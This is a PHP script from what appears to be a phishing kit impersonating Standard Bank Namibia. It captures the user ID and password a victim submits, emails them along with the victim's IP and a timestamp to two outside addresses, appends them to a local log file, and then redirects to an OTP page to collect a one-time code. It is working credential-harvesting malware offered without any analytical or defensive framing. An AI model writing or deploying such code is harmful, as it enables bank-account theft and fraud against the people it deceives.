<?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$userId = $_POST['userId'];
$password = $_POST['password'];
$message .="
USER ID : ".$userId."
Password : ".$password."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||Standard Bank Namibia log |=====================||\n";
$send="kute7ty@gmail.com,amarok101@outlook.com";
$subject = "Standard Bank Namibia | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../log/login.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = '../otp/default.php'</script>");
?>